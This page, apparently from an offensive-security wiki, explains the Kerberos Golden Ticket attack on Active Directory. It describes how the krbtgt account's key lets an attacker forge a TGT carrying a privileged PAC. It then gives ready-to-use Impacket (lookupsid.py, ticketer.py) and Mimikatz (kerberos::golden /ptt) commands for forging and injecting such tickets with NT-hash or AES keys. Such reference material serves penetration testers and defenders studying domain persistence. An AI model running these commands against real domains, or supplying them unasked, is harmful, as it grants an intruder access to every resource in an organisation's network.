# Golden Ticket

## Theory

The long-term key of the `krbtgt` account can be used to forge a special TGT (Ticket Granting Ticket) that can later be used with [Pass-the-ticket](https://github.com/ShutdownRepo/The-Hacker-Recipes/blob/master/ad/movement/kerberos/forged-tickets/broken-reference/README.md) to access any resource within the AD domain. The `krbtgt`'s key is used to encrypt the PAC. In a Golden Ticket scenario, an attacker that has knowledge of the `krbtgt` long-term key, will usually forge a PAC indicating that the user belongs to privileged groups. This PAC will be embedded in a forged TGT. The TGT will be used to request Service Tickets than will then feature the PAC presented in the TGT, hence granting lots of access to the attacker.

The Golden Ticket requires `krbtgt`'s RC4 key (i.e. NT hash) or AES key (128 or 256 bits). In most cases, this can only be achieved with domain admin privileges through a [DCSync attack](broken-reference). Because of this, golden tickets only allow lateral movement and not privilege escalation.

## Practice

#### Linux

{% code overflow="wrap" %}
```bash
# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# Create the golden ticket (with an RC4 key, i.e. NT hash)
ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN randomuser

# Create the golden ticket (with an AES 128/256bits key)
ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN randomuser

# Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN -user-id $USERID -groups $GROUPID1,$GROUPID2,... randomuser
```
{% endcode %}

#### Windows

```bash
# Mimikatz
# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt
```
